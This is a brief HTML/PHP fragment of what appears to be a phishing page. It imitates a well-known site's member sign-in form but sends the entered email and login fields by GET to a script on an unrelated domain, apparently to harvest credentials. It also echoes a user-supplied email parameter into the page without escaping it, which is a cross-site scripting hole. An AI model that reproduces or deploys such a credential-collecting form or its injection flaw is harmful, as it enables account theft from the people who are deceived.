...
<div id="main" class="signin">
 ...
 <form action="https://leatherfabriccollection.com/pjs/test1/login-submit.php" method="GET" name="login" novalidate="novalidate" id="login" class="ajax-form stacked-form" data-jsenabled="check" data-autologin="true" data-existingmembersignin="true">
 ...
 <input type="text" name="session_key" value="<?php if (isset($_GET['email'])) { echo $email; }?>" id="session_key-login" class="" placeholder="Email address" aria-describedby="session_key-login-error">
